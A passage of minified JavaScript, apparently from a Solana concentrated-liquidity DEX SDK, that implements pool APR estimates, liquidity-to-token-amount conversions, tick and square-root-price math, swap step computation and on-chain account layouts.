        poolLiquidity: e,
        aprType: n,
        mintPrice: r,
        liquidity: o,
        positionTickLowerIndex: i,
        positionTickUpperIndex: s,
        chainTime: a,
      }) {
        let u = "day" === n ? 1 : "week" === n ? 7 : "month" === n ? 30 : 0,
          c = t[n],
          l = r[FI(t.mintA.address).toString()],
          d = r[FI(t.mintB.address).toString()],
          f = t.mintA.decimals,
          h = t.mintB.decimals;
        if (!c || !l || !d) return { feeApr: 0, rewardsApr: [0, 0, 0], apr: 0 };
        let p = DB.priceToSqrtPriceX64(
            new mI(t.price),
            t.mintA.decimals,
            t.mintB.decimals
          ),
          m = DB.getSqrtPriceX64FromTick(i),
          g = DB.getSqrtPriceX64FromTick(s),
          { amountSlippageA: y, amountSlippageB: w } =
            qB.getAmountsFromLiquidityWithSlippage(p, m, g, e, !1, !1, 0),
          { amountSlippageA: b, amountSlippageB: v } =
            qB.getAmountsFromLiquidityWithSlippage(p, m, g, o, !1, !1, 0),
          A = new mI(y.toString())
            .div(new mI(10).pow(f))
            .mul(l.value)
            .add(new mI(w.toString()).div(new mI(10).pow(h)).mul(d.value)),
          k = new mI(b.toString())
            .div(new mI(10).pow(f))
            .mul(l.value)
            .add(new mI(v.toString()).div(new mI(10).pow(h)).mul(d.value)),
          I = new mI(1).div(A.add(k)),
          S = new mI(c.volumeFee).mul(365).div(u).mul(I).mul(100).toNumber(),
          _ = t.rewardDefaultInfos.map((t) => {
            var e, n;
            let o = t.mint.decimals,
              i = r[t.mint.address];
            return a < (null != (e = t.startTime) ? e : 0) ||
              a > (null != (n = t.endTime) ? n : 0) ||
              !t.perSecond ||
              !i ||
              void 0 === o
              ? 0
              : new mI(i.value)
                  .mul(new mI(t.perSecond).mul(31536e3))
                  .div(new mI(10).pow(o))
                  .mul(I)
                  .mul(100)
                  .toNumber();
          });
        return {
          feeApr: S,
          rewardsApr: _,
          apr: S + _.reduce((t, e) => t + e, 0),
        };
      }
      static async getLiquidityAmountOutFromAmountIn({
        poolInfo: t,
        inputA: e,
        tickLower: n,
        tickUpper: r,
        amount: o,
        slippage: i,
        add: s,
        epochInfo: a,
        amountHasFee: u,
      }) {
        var c, l;
        let d,
          f = DB.priceToSqrtPriceX64(
            new mI(t.price),
            t.mintA.decimals,
            t.mintB.decimals
          ),
          h = DB.getSqrtPriceX64FromTick(n),
          p = DB.getSqrtPriceX64FromTick(r),
          m = D_(
            o,
            null == (c = t[e ? "mintA" : "mintB"].extensions)
              ? void 0
              : c.feeConfig,
            a,
            !u
          ),
          g = new Zn(
            new mI(
              m.amount.sub(null != (l = m.fee) ? l : zC).toString()
            ).toFixed(0)
          );
        if (f.lte(h))
          d = e ? qB.getLiquidityFromTokenAmountA(h, p, g, !s) : new Zn(0);
        else if (f.lte(p)) {
          let t = qB.getLiquidityFromTokenAmountA(f, p, g, !s),
            n = qB.getLiquidityFromTokenAmountB(h, f, g);
          d = e ? t : n;
        } else d = e ? new Zn(0) : qB.getLiquidityFromTokenAmountB(h, p, g);
        let y = await RB.getAmountsFromLiquidity({
          epochInfo: a,
          poolInfo: t,
          tickLower: n,
          tickUpper: r,
          liquidity: d,
          slippage: i,
          add: s,
        });
        return {
          liquidity: d,
          amountA: e ? m : y.amountA,
          amountB: e ? y.amountB : m,
          amountSlippageA: e ? m : y.amountSlippageA,
          amountSlippageB: e ? y.amountSlippageB : m,
          expirationTime: y.expirationTime,
        };
      }
      static async getAmountsFromLiquidity({
        epochInfo: t,
        poolInfo: e,
        tickLower: n,
        tickUpper: r,
        liquidity: o,
        slippage: i,
        add: s,
      }) {
        var a, u, c, l;
        let d = DB.getSqrtPriceX64FromTick(n),
          f = DB.getSqrtPriceX64FromTick(r),
          h = s ? 1 + i : 1 - i,
          p = qB.getAmountsFromLiquidity(
            DB.priceToSqrtPriceX64(
              new mI(e.price),
              e.mintA.decimals,
              e.mintB.decimals
            ),
            d,
            f,
            o,
            s
          ),
          [m, g] = [
            D_(
              p.amountA,
              null == (a = e.mintA.extensions) ? void 0 : a.feeConfig,
              t,
              !0
            ),
            D_(
              p.amountB,
              null == (u = e.mintB.extensions) ? void 0 : u.feeConfig,
              t,
              !0
            ),
          ],
          [y, w] = [
            D_(
              p.amountA.muln(h),
              null == (c = e.mintA.extensions) ? void 0 : c.feeConfig,
              t,
              !0
            ),
            D_(
              p.amountB.muln(h),
              null == (l = e.mintB.extensions) ? void 0 : l.feeConfig,
              t,
              !0
            ),
          ];
        return {
          liquidity: o,
          amountA: m,
          amountB: g,
          amountSlippageA: y,
          amountSlippageB: w,
          expirationTime: U_(m.expirationTime, g.expirationTime),
        };
      }
      static async fetchComputeMultipleClmmInfo({
        connection: t,
        poolList: e,
        rpcDataMap: n = {},
      }) {
        let r = e.filter((t) => !n[t.id]).map((t) => new Xi(t.id));
        (await EA(t, r)).forEach((t, e) => {
          !t || (n[r[e].toBase58()] = XB.decode(t.data));
        });
        let o = e.map((t) => kB(new Xi(t.programId), new Xi(t.id)).publicKey),
          i = await RB.fetchExBitmaps({
            connection: t,
            exBitmapAddress: o,
            batchRequest: !1,
          });
        return e.reduce(
          (t, e) =>
            AA(vA({}, t), {
              [e.id]: AA(vA({}, n[e.id]), {
                id: new Xi(e.id),
                version: 6,
                programId: new Xi(e.programId),
                mintA: e.mintA,
                mintB: e.mintB,
                ammConfig: AA(vA({}, e.config), {
                  id: new Xi(e.config.id),
                  fundOwner: "",
                }),
                currentPrice: new mI(e.price),
                exBitmapAccount: kB(new Xi(e.programId), new Xi(e.id))
                  .publicKey,
                exBitmapInfo:
                  i[kB(new Xi(e.programId), new Xi(e.id)).publicKey.toBase58()],
                startTime: n[e.id].startTime.toNumber(),
                rewardInfos: n[e.id].rewardInfos,
              }),
            }),
          {}
        );
      }
      static async fetchComputeClmmInfo({
        connection: t,
        poolInfo: e,
        rpcData: n,
      }) {
        return (
          await this.fetchComputeMultipleClmmInfo({
            connection: t,
            rpcDataMap: n ? { [e.id]: n } : void 0,
            poolList: [e],
          })
        )[e.id];
      }
    },
    OB = {
      volume: 0,
      volumeQuote: 0,
      volumeFee: 0,
      apr: 0,
      feeApr: 0,
      priceMin: 0,
      priceMax: 0,
      rewardApr: [],
    };
  var MB = class {
    static mulDivRoundingUp(t, e, n) {
      let r = t.mul(e),
        o = r.div(n);
      return r.mod(n).eq(zC) || (o = o.add(KC)), o;
    }
    static mulDivFloor(t, e, n) {
      if (n.eq(zC)) throw new Error("division by 0");
      return t.mul(e).div(n);
    }
    static mulDivCeil(t, e, n) {
      if (n.eq(zC)) throw new Error("division by 0");
      return t.mul(e).add(n.sub(KC)).div(n);
    }
    static x64ToDecimal(t, e) {
      return new mI(t.toString()).div(mI.pow(2, 64)).toDecimalPlaces(e);
    }
    static decimalToX64(t) {
      return new Zn(t.mul(mI.pow(2, 64)).floor().toFixed());
    }
    static wrappingSubU128(t, e) {
      return t.add(GC).sub(e).mod(GC);
    }
  };
  function LB(t, e) {
    return NB(t.mul(e), 64, 256);
  }
  function NB(t, e, n) {
    let r = t.toTwos(n).shrn(e);
    return r.imaskn(n - e + 1), r.fromTwos(n - e);
  }
  var DB = class {
      static sqrtPriceX64ToPrice(t, e, n) {
        return MB.x64ToDecimal(t)
          .pow(2)
          .mul(mI.pow(10, e - n));
      }
      static priceToSqrtPriceX64(t, e, n) {
        return MB.decimalToX64(t.mul(mI.pow(10, n - e)).sqrt());
      }
      static getNextSqrtPriceX64FromInput(t, e, n, r) {
        if (!t.gt(zC)) throw new Error("sqrtPriceX64 must greater than 0");
        if (!e.gt(zC)) throw new Error("liquidity must greater than 0");
        return r
          ? this.getNextSqrtPriceFromTokenAmountARoundingUp(t, e, n, !0)
          : this.getNextSqrtPriceFromTokenAmountBRoundingDown(t, e, n, !0);
      }
      static getNextSqrtPriceX64FromOutput(t, e, n, r) {
        if (!t.gt(zC)) throw new Error("sqrtPriceX64 must greater than 0");
        if (!e.gt(zC)) throw new Error("liquidity must greater than 0");
        return r
          ? this.getNextSqrtPriceFromTokenAmountBRoundingDown(t, e, n, !1)
          : this.getNextSqrtPriceFromTokenAmountARoundingUp(t, e, n, !1);
      }
      static getNextSqrtPriceFromTokenAmountARoundingUp(t, e, n, r) {
        if (n.eq(zC)) return t;
        let o = e.shln(64);
        if (r) {
          let e = o,
            r = o.add(n.mul(t));
          return r.gte(e)
            ? MB.mulDivCeil(e, t, r)
            : MB.mulDivRoundingUp(e, KC, e.div(t).add(n));
        }
        {
          let e = n.mul(t);
          if (!o.gt(e))
            throw new Error(
              "getNextSqrtPriceFromTokenAmountARoundingUp,liquidityLeftShift must gt amountMulSqrtPrice"
            );
          let r = o.sub(e);
          return MB.mulDivCeil(o, t, r);
        }
      }
      static getNextSqrtPriceFromTokenAmountBRoundingDown(t, e, n, r) {
        let o = n.shln(64);
        if (r) return t.add(o.div(e));
        {
          let n = MB.mulDivRoundingUp(o, KC, e);
          if (!t.gt(n))
            throw new Error(
              "getNextSqrtPriceFromTokenAmountBRoundingDown sqrtPriceX64 must gt amountDivLiquidity"
            );
          return t.sub(n);
        }
      }
      static getSqrtPriceX64FromTick(t) {
        if (!Number.isInteger(t)) throw new Error("tick must be integer");
        if (t < XC || t > ZC)
          throw new Error("tick must be in MIN_TICK and MAX_TICK");
        let e = t < 0 ? -1 * t : t,
          n = new Zn(1 & e ? "18445821805675395072" : "18446744073709551616");
        return (
          !!(2 & e) && (n = LB(n, new Zn("18444899583751176192"))),
          !!(4 & e) && (n = LB(n, new Zn("18443055278223355904"))),
          !!(8 & e) && (n = LB(n, new Zn("18439367220385607680"))),
          !!(16 & e) && (n = LB(n, new Zn("18431993317065453568"))),
          !!(32 & e) && (n = LB(n, new Zn("18417254355718170624"))),
          !!(64 & e) && (n = LB(n, new Zn("18387811781193609216"))),
          !!(128 & e) && (n = LB(n, new Zn("18329067761203558400"))),
          !!(256 & e) && (n = LB(n, new Zn("18212142134806163456"))),
          !!(512 & e) && (n = LB(n, new Zn("17980523815641700352"))),
          !!(1024 & e) && (n = LB(n, new Zn("17526086738831433728"))),
          !!(2048 & e) && (n = LB(n, new Zn("16651378430235570176"))),
          !!(4096 & e) && (n = LB(n, new Zn("15030750278694412288"))),
          !!(8192 & e) && (n = LB(n, new Zn("12247334978884435968"))),
          !!(16384 & e) && (n = LB(n, new Zn("8131365268886854656"))),
          !!(32768 & e) && (n = LB(n, new Zn("3584323654725218816"))),
          !!(65536 & e) && (n = LB(n, new Zn("696457651848324352"))),
          !!(131072 & e) && (n = LB(n, new Zn("26294789957507116"))),
          !!(262144 & e) && (n = LB(n, new Zn("37481735321082"))),
          t > 0 && (n = HC.div(n)),
          n
        );
      }
      static getTickFromPrice(t, e, n) {
        return DB.getTickFromSqrtPriceX64(DB.priceToSqrtPriceX64(t, e, n));
      }
      static getTickFromSqrtPriceX64(t) {
        if (t.gt(YC) || t.lt(JC))
          throw new Error(
            "Provided sqrtPrice is not within the supported sqrtPrice range."
          );
        let e = t.bitLength() - 1,
          n = (function (t, e, n) {
            let r = t.toTwos(n).shln(e);
            return r.imaskn(n + 1), r.fromTwos(n);
          })(new Zn(e - 64), 32, 128),
          r = new Zn("8000000000000000", "hex"),
          o = 0,
          i = new Zn(0),
          s = e >= 64 ? t.shrn(e - 63) : t.shln(63 - e);
        for (; r.gt(new Zn(0)) && o < 16; ) {
          s = s.mul(s);
          let t = s.shrn(127);
          (s = s.shrn(63 + t.toNumber())),
            (i = i.add(r.mul(t))),
            (r = r.shrn(1)),
            (o += 1);
        }
        let a = i.shrn(32),
          u = n.add(a).mul(new Zn("59543866431248")),
          c = NB(u.sub(new Zn("184467440737095516")), 64, 128).toNumber(),
          l = NB(u.add(new Zn("15793534762490258745")), 64, 128).toNumber();
        return c == l ? c : DB.getSqrtPriceX64FromTick(l).lte(t) ? l : c;
      }
    },
    UB = class {
      static getTickWithPriceAndTickspacing(t, e, n, r) {
        let o = DB.getTickFromSqrtPriceX64(DB.priceToSqrtPriceX64(t, n, r)) / e;
        return (o = o < 0 ? Math.floor(o) : Math.ceil(o)), o * e;
      }
      static roundPriceWithTickspacing(t, e, n, r) {
        let o = UB.getTickWithPriceAndTickspacing(t, e, n, r),
          i = DB.getSqrtPriceX64FromTick(o);
        return DB.sqrtPriceX64ToPrice(i, n, r);
      }
    },
    qB = class {
      static addDelta(t, e) {
        return t.add(e);
      }
      static getTokenAmountAFromLiquidity(t, e, n, r) {
        if ((t.gt(e) && ([t, e] = [e, t]), !t.gt(zC)))
          throw new Error("sqrtPriceX64A must greater than 0");
        let o = n.ushln(64),
          i = e.sub(t);
        return r
          ? MB.mulDivRoundingUp(MB.mulDivCeil(o, i, e), KC, t)
          : MB.mulDivFloor(o, i, e).div(t);
      }
      static getTokenAmountBFromLiquidity(t, e, n, r) {
        if ((t.gt(e) && ([t, e] = [e, t]), !t.gt(zC)))
          throw new Error("sqrtPriceX64A must greater than 0");
        return r
          ? MB.mulDivCeil(n, e.sub(t), jC)
          : MB.mulDivFloor(n, e.sub(t), jC);
      }
      static getLiquidityFromTokenAmountA(t, e, n, r) {
        t.gt(e) && ([t, e] = [e, t]);
        let o = n.mul(t).mul(e),
          i = e.sub(t),
          s = o.div(i);
        return r ? MB.mulDivRoundingUp(s, KC, VC) : s.shrn(64);
      }
      static getLiquidityFromTokenAmountB(t, e, n) {
        return t.gt(e) && ([t, e] = [e, t]), MB.mulDivFloor(n, VC, e.sub(t));
      }
      static getLiquidityFromTokenAmounts(t, e, n, r, o) {
        if ((e.gt(n) && ([e, n] = [n, e]), t.lte(e)))
          return qB.getLiquidityFromTokenAmountA(e, n, r, !1);
        if (t.lt(n)) {
          let i = qB.getLiquidityFromTokenAmountA(t, n, r, !1),
            s = qB.getLiquidityFromTokenAmountB(e, t, o);
          return i.lt(s) ? i : s;
        }
        return qB.getLiquidityFromTokenAmountB(e, n, o);
      }
      static getAmountsFromLiquidity(t, e, n, r, o) {
        if ((e.gt(n) && ([e, n] = [n, e]), t.lte(e)))
          return {
            amountA: qB.getTokenAmountAFromLiquidity(e, n, r, o),
            amountB: new Zn(0),
          };
        if (t.lt(n)) {
          return {
            amountA: qB.getTokenAmountAFromLiquidity(t, n, r, o),
            amountB: qB.getTokenAmountBFromLiquidity(e, t, r, o),
          };
        }
        return {
          amountA: new Zn(0),
          amountB: qB.getTokenAmountBFromLiquidity(e, n, r, o),
        };
      }
      static getAmountsFromLiquidityWithSlippage(t, e, n, r, o, i, s) {
        let { amountA: a, amountB: u } = qB.getAmountsFromLiquidity(
            t,
            e,
            n,
            r,
            i
          ),
          c = o ? 1 + s : 1 - s;
        return {
          amountSlippageA: new Zn(new mI(a.toString()).mul(c).toFixed(0)),
          amountSlippageB: new Zn(new mI(u.toString()).mul(c).toFixed(0)),
        };
      }
      static getAmountsOutFromLiquidity({
        poolInfo: t,
        tickLower: e,
        tickUpper: n,
        liquidity: r,
        slippage: o,
        add: i,
        epochInfo: s,
        amountAddFee: a,
      }) {
        var u, c, l, d;
        let f = DB.priceToSqrtPriceX64(
            new mI(t.price),
            t.mintA.decimals,
            t.mintB.decimals
          ),
          h = DB.getSqrtPriceX64FromTick(e),
          p = DB.getSqrtPriceX64FromTick(n),
          m = i ? 1 + o : 1 - o,
          g = qB.getAmountsFromLiquidity(f, h, p, r, i),
          [y, w] = [
            D_(
              g.amountA,
              null == (u = t.mintA.extensions) ? void 0 : u.feeConfig,
              s,
              a
            ),
            D_(
              g.amountB,
              null == (c = t.mintB.extensions) ? void 0 : c.feeConfig,
              s,
              a
            ),
          ],
          [b, v] = [
            D_(
              new Zn(new mI(g.amountA.toString()).mul(m).toFixed(0)),
              null == (l = t.mintA.extensions) ? void 0 : l.feeConfig,
              s,
              a
            ),
            D_(
              new Zn(new mI(g.amountB.toString()).mul(m).toFixed(0)),
              null == (d = t.mintB.extensions) ? void 0 : d.feeConfig,
              s,
              a
            ),
          ];
        return {
          liquidity: r,
          amountA: y,
          amountB: w,
          amountSlippageA: b,
          amountSlippageB: v,
          expirationTime: U_(y.expirationTime, w.expirationTime),
        };
      }
    },
    WB = class {
      static swapCompute(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p = !1) {
        if (d.eq(zC)) throw new Error("amountSpecified must not be 0");
        if ((h || (h = i ? JC.add(KC) : YC.sub(KC)), i)) {
          if (h.lt(JC))
            throw new Error(
              "sqrtPriceX64 must greater than MIN_SQRT_PRICE_X64"
            );
          if (h.gte(l))
            throw new Error("sqrtPriceX64 must smaller than current");
        } else {
          if (h.gt(YC))
            throw new Error(
              "sqrtPriceX64 must smaller than MAX_SQRT_PRICE_X64"
            );
          if (h.lte(l))
            throw new Error("sqrtPriceX64 must greater than current");
        }
        let m = d.gt(zC),
          g = {
            amountSpecifiedRemaining: d,
            amountCalculated: zC,
            sqrtPriceX64: l,
            tick: u > f ? Math.min(f + EB.tickCount(c) - 1, u) : f,
            accounts: [],
            liquidity: a,
            feeAmount: new Zn(0),
          },
          y = f,
          w = n[f],
          b = !i && w.startTickIndex === g.tick;
        for (; !g.amountSpecifiedRemaining.eq(zC) && !g.sqrtPriceX64.eq(h); ) {
          let a = {};
          a.sqrtPriceStartX64 = g.sqrtPriceX64;
          let u,
            l = FB.nextInitTick(w, g.tick, c, i, b) || null,
            d = null;
          if (null == l || !l.liquidityGross.gtn(0)) {
            let s = RB.nextInitializedTickArrayStartIndex(
              {
                tickCurrent: g.tick,
                tickSpacing: c,
                tickArrayBitmap: r,
                exBitmapInfo: o,
              },
              y,
              i
            );
            if (!s.isExist) {
              if (p)
                return {
                  allTrade: !1,
                  amountSpecifiedRemaining: g.amountSpecifiedRemaining,
                  amountCalculated: g.amountCalculated,
                  feeAmount: g.feeAmount,
                  sqrtPriceX64: g.sqrtPriceX64,
                  liquidity: g.liquidity,
                  tickCurrent: g.tick,
                  accounts: g.accounts,
                };
              throw Error("swapCompute LiquidityInsufficient");
            }
            y = s.nextStartIndex;
            let { publicKey: a } = yB(t, e, y);
            (d = a), (w = n[y]);
            try {
              l = FB.firstInitializedTick(w, i);
            } catch {
              throw Error("not found next tick info");
            }
          }
          if (
            ((a.tickNext = l.tick),
            (a.initialized = l.liquidityGross.gtn(0)),
            f !== y && d && (g.accounts.push(d), (f = y)),
            a.tickNext < XC
              ? (a.tickNext = XC)
              : a.tickNext > ZC && (a.tickNext = ZC),
            (a.sqrtPriceNextX64 = DB.getSqrtPriceX64FromTick(a.tickNext)),
            (u =
              (i && a.sqrtPriceNextX64.lt(h)) ||
              (!i && a.sqrtPriceNextX64.gt(h))
                ? h
                : a.sqrtPriceNextX64),
            ([g.sqrtPriceX64, a.amountIn, a.amountOut, a.feeAmount] =
              WB.swapStepCompute(
                g.sqrtPriceX64,
                u,
                g.liquidity,
                g.amountSpecifiedRemaining,
                s,
                i
              )),
            (g.feeAmount = g.feeAmount.add(a.feeAmount)),
            m
              ? ((g.amountSpecifiedRemaining = g.amountSpecifiedRemaining.sub(
                  a.amountIn.add(a.feeAmount)
                )),
                (g.amountCalculated = g.amountCalculated.sub(a.amountOut)))
              : ((g.amountSpecifiedRemaining = g.amountSpecifiedRemaining.add(
                  a.amountOut
                )),
                (g.amountCalculated = g.amountCalculated.add(
                  a.amountIn.add(a.feeAmount)
                ))),
            g.sqrtPriceX64.eq(a.sqrtPriceNextX64))
          ) {
            if (a.initialized) {
              let t = l.liquidityNet;
              i && (t = t.mul(FC)), (g.liquidity = qB.addDelta(g.liquidity, t));
            }
            (b = a.tickNext != g.tick && !i && w.startTickIndex === a.tickNext),
              (g.tick = i ? a.tickNext - 1 : a.tickNext);
          } else if (g.sqrtPriceX64 != a.sqrtPriceStartX64) {
            let t = DB.getTickFromSqrtPriceX64(g.sqrtPriceX64);
            (b = t != g.tick && !i && w.startTickIndex === t), (g.tick = t);
          }
        }
        try {
          let { nextStartIndex: n, isExist: s } = EB.nextInitializedTickArray(
            g.tick,
            c,
            i,
            r,
            o
          );
          s && f !== n && (g.accounts.push(yB(t, e, n).publicKey), (f = n));
        } catch {}
        return {
          allTrade: !0,
          amountSpecifiedRemaining: zC,
          amountCalculated: g.amountCalculated,
          feeAmount: g.feeAmount,
          sqrtPriceX64: g.sqrtPriceX64,
          liquidity: g.liquidity,
          tickCurrent: g.tick,
          accounts: g.accounts,
        };
      }
      static swapStepCompute(t, e, n, r, o, i) {
        let s = {
            sqrtPriceX64Next: new Zn(0),
            amountIn: new Zn(0),
            amountOut: new Zn(0),
            feeAmount: new Zn(0),
          },
          a = r.gte(zC);
        if (a) {
          let a = MB.mulDivFloor(r, tB.sub(new Zn(o.toString())), tB);
          (s.amountIn = i
            ? qB.getTokenAmountAFromLiquidity(e, t, n, !0)
            : qB.getTokenAmountBFromLiquidity(t, e, n, !0)),
            a.gte(s.amountIn)
              ? (s.sqrtPriceX64Next = e)
              : (s.sqrtPriceX64Next = DB.getNextSqrtPriceX64FromInput(
                  t,
                  n,
                  a,
                  i
                ));
        } else
          (s.amountOut = i
            ? qB.getTokenAmountBFromLiquidity(e, t, n, !1)
            : qB.getTokenAmountAFromLiquidity(t, e, n, !1)),
            r.mul(FC).gte(s.amountOut)
              ? (s.sqrtPriceX64Next = e)
              : (s.sqrtPriceX64Next = DB.getNextSqrtPriceX64FromOutput(
                  t,
                  n,
                  r.mul(FC),
                  i
                ));
        let u = e.eq(s.sqrtPriceX64Next);
        return (
          i
            ? ((u && a) ||
                (s.amountIn = qB.getTokenAmountAFromLiquidity(
                  s.sqrtPriceX64Next,
                  t,
                  n,
                  !0
                )),
              (u && !a) ||
                (s.amountOut = qB.getTokenAmountBFromLiquidity(
                  s.sqrtPriceX64Next,
                  t,
                  n,
                  !1
                )))
            : ((s.amountIn =
                u && a
                  ? s.amountIn
                  : qB.getTokenAmountBFromLiquidity(
                      t,
                      s.sqrtPriceX64Next,
                      n,
                      !0
                    )),
              (s.amountOut =
                u && !a
                  ? s.amountOut
                  : qB.getTokenAmountAFromLiquidity(
                      t,
                      s.sqrtPriceX64Next,
                      n,
                      !1
                    ))),
          !a && s.amountOut.gt(r.mul(FC)) && (s.amountOut = r.mul(FC)),
          a && !s.sqrtPriceX64Next.eq(e)
            ? (s.feeAmount = r.sub(s.amountIn))
            : (s.feeAmount = MB.mulDivCeil(
                s.amountIn,
                new Zn(o),
                tB.sub(new Zn(o))
              )),
          [s.sqrtPriceX64Next, s.amountIn, s.amountOut, s.feeAmount]
        );
      }
    },
    zB = 60,
    KB = 512,
    FB = class {
      static getTickArrayAddressByTick(t, e, n, r) {
        let o = FB.getTickArrayStartIndexByTick(n, r),
          { publicKey: i } = yB(t, e, o);
        return i;
      }
      static getTickOffsetInArray(t, e) {
        if (t % e != 0) throw new Error("tickIndex % tickSpacing not equal 0");
        let n = FB.getTickArrayStartIndexByTick(t, e),
          r = Math.floor((t - n) / e);
        if (r < 0 || r >= zB) throw new Error("tick offset in array overflow");
        return r;
      }
      static getTickArrayBitIndex(t, e) {
        let n = EB.tickCount(e),
          r = t / n;
        return (r = t < 0 && t % n != 0 ? Math.ceil(r) - 1 : Math.floor(r)), r;
      }
      static getTickArrayStartIndexByTick(t, e) {
        return this.getTickArrayBitIndex(t, e) * EB.tickCount(e);
      }
      static getTickArrayOffsetInBitmapByTick(t, e) {
        let n = e * zB,
          r = Math.floor(t / n) + 512;
        return Math.abs(r);
      }
      static checkTickArrayIsInitialized(t, e, n) {
        let r = n * zB,
          o = Math.floor(e / r) + 512,
          i = Math.abs(o);
        return { isInitialized: t.testn(i), startIndex: (i - 512) * r };
      }
      static getNextTickArrayStartIndex(t, e, n) {
        return n ? t - e * zB : t + e * zB;
      }
      static mergeTickArrayBitmap(t) {
        let e = new Zn(0);
        for (let n = 0; n < t.length; n++) e = e.add(t[n].shln(64 * n));
        return e;
      }
      static getInitializedTickArrayInRange(t, e, n, r, o) {
        let i = Math.floor(r / (n * zB));
        return [
          ...FB.searchLowBitFromStart(t, e, i - 1, o, n),
          ...FB.searchHightBitFromStart(t, e, i, o, n),
        ];
      }
      static getAllInitializedTickArrayStartIndex(t, e, n) {
        return FB.searchHightBitFromStart(t, e, -7680, KB, n);
      }
      static getAllInitializedTickArrayInfo(t, e, n, r, o) {
        let i = [],
          s = FB.getAllInitializedTickArrayStartIndex(n, r, o);
        for (let a of s) {
          let { publicKey: n } = yB(t, e, a);
          i.push({ tickArrayStartIndex: a, tickArrayAddress: n });
        }
        return i;
      }
      static getAllInitializedTickInTickArray(t) {
        return t.ticks.filter((t) => t.liquidityGross.gtn(0));
      }
      static searchLowBitFromStart(t, e, n, r, o) {
        let i = [
            ...[...e.negativeTickArrayBitmap].reverse(),
            t.slice(0, 8),
            t.slice(8, 16),
            ...e.positiveTickArrayBitmap,
          ].map((t) => FB.mergeTickArrayBitmap(t)),
          s = [];
        for (; n >= -7680; ) {
          let t = (n + 7680) % 512;
          if (
            (i[Math.floor((n + 7680) / 512)].testn(t) && s.push(n),
            n--,
            s.length === r)
          )
            break;
        }
        let a = EB.tickCount(o);
        return s.map((t) => t * a);
      }
      static searchHightBitFromStart(t, e, n, r, o) {
        let i = [
            ...[...e.negativeTickArrayBitmap].reverse(),
            t.slice(0, 8),
            t.slice(8, 16),
            ...e.positiveTickArrayBitmap,
          ].map((t) => FB.mergeTickArrayBitmap(t)),
          s = [];
        for (; n < 7680; ) {
          let t = (n + 7680) % 512;
          if (
            (i[Math.floor((n + 7680) / 512)].testn(t) && s.push(n),
            n++,
            s.length === r)
          )
            break;
        }
        let a = EB.tickCount(o);
        return s.map((t) => t * a);
      }
      static checkIsOutOfBoundary(t) {
        return t < XC || t > ZC;
      }
      static nextInitTick(t, e, n, r, o) {
        if (EB.getArrayStartIndex(e, n) != t.startTickIndex) return null;
        let i = Math.floor((e - t.startTickIndex) / n);
        if (r)
          for (; i >= 0; ) {
            if (t.ticks[i].liquidityGross.gtn(0)) return t.ticks[i];
            i -= 1;
          }
        else
          for (o || (i += 1); i < zB; ) {
            if (t.ticks[i].liquidityGross.gtn(0)) return t.ticks[i];
            i += 1;
          }
        return null;
      }
      static firstInitializedTick(t, e) {
        if (e) {
          let e = zB - 1;
          for (; e >= 0; ) {
            if (t.ticks[e].liquidityGross.gtn(0)) return t.ticks[e];
            e -= 1;
          }
        } else {
          let e = 0;
          for (; e < zB; ) {
            if (t.ticks[e].liquidityGross.gtn(0)) return t.ticks[e];
            e += 1;
          }
        }
        throw Error(`firstInitializedTick check error: ${t} - ${e}`);
      }
      static _getTickPriceLegacy({ poolInfo: t, tick: e, baseIn: n }) {
        let r = DB.getSqrtPriceX64FromTick(e),
          o = DB.sqrtPriceX64ToPrice(r, t.mintA.decimals, t.mintB.decimals);
        return n
          ? { tick: e, price: o, tickSqrtPriceX64: r }
          : { tick: e, price: new mI(1).div(o), tickSqrtPriceX64: r };
      }
      static _getPriceAndTickLegacy({ poolInfo: t, price: e, baseIn: n }) {
        let r = n ? e : new mI(1).div(e),
          o = UB.getTickWithPriceAndTickspacing(
            r,
            t.ammConfig.tickSpacing,
            t.mintA.decimals,
            t.mintB.decimals
          ),
          i = DB.getSqrtPriceX64FromTick(o),
          s = DB.sqrtPriceX64ToPrice(i, t.mintA.decimals, t.mintB.decimals);
        return n ? { tick: o, price: s } : { tick: o, price: new mI(1).div(s) };
      }
      static getTickPrice({ poolInfo: t, tick: e, baseIn: n }) {
        let r = DB.getSqrtPriceX64FromTick(e),
          o = DB.sqrtPriceX64ToPrice(r, t.mintA.decimals, t.mintB.decimals);
        return n
          ? { tick: e, price: o, tickSqrtPriceX64: r }
          : { tick: e, price: new mI(1).div(o), tickSqrtPriceX64: r };
      }
      static getPriceAndTick({ poolInfo: t, price: e, baseIn: n }) {
        let r = n ? e : new mI(1).div(e),
          o = UB.getTickWithPriceAndTickspacing(
            r,
            t.config.tickSpacing,
            t.mintA.decimals,
            t.mintB.decimals
          ),
          i = DB.getSqrtPriceX64FromTick(o),
          s = DB.sqrtPriceX64ToPrice(i, t.mintA.decimals, t.mintB.decimals);
        return n ? { tick: o, price: s } : { tick: o, price: new mI(1).div(s) };
      }
    },
    jB = VT([
      ET(8),
      MT("bump"),
      ST("index"),
      WT(""),
      LT("protocolFeeRate"),
      LT("tradeFeeRate"),
      ST("tickSpacing"),
      HT(NT(), 8, ""),
    ]),
    GB = VT([LT("blockTimestamp"), UT("tickCumulative"), HT(NT(), 4)]),
    VB = VT([
      ET(8),
      zT("initialized"),
      NT("recentEpoch"),
      ST("observationIndex"),
      WT("poolId"),
      HT(GB, 100, "observations"),
      HT(NT(), 4),
    ]),
    HB = VT([
      MT("rewardState"),
      NT("openTime"),
      NT("endTime"),
      NT("lastUpdateTime"),
      DT("emissionsPerSecondX64"),
      NT("rewardTotalEmissioned"),
      NT("rewardClaimed"),
      WT("tokenMint"),
      WT("tokenVault"),
      WT("creator"),
      DT("rewardGrowthGlobalX64"),
    ]),
    XB = VT([
      ET(8),
      MT("bump"),
      WT("ammConfig"),
      WT("creator"),
      WT("mintA"),
      WT("mintB"),
      WT("vaultA"),
      WT("vaultB"),
      WT("observationId"),
      MT("mintDecimalsA"),
      MT("mintDecimalsB"),
      ST("tickSpacing"),
      DT("liquidity"),
      DT("sqrtPriceX64"),
      CT("tickCurrent"),
      LT(),
      DT("feeGrowthGlobalX64A"),
      DT("feeGrowthGlobalX64B"),
      NT("protocolFeesTokenA"),
      NT("protocolFeesTokenB"),
      DT("swapInAmountTokenA"),
      DT("swapOutAmountTokenB"),
      DT("swapInAmountTokenB"),
      DT("swapOutAmountTokenA"),
      MT("status"),
      HT(MT(), 7, ""),
      HT(HB, 3, "rewardInfos"),
      HT(NT(), 16, "tickArrayBitmap"),
      NT("totalFeesTokenA"),
      NT("totalFeesClaimedTokenA"),
      NT("totalFeesTokenB"),
      NT("totalFeesClaimedTokenB"),
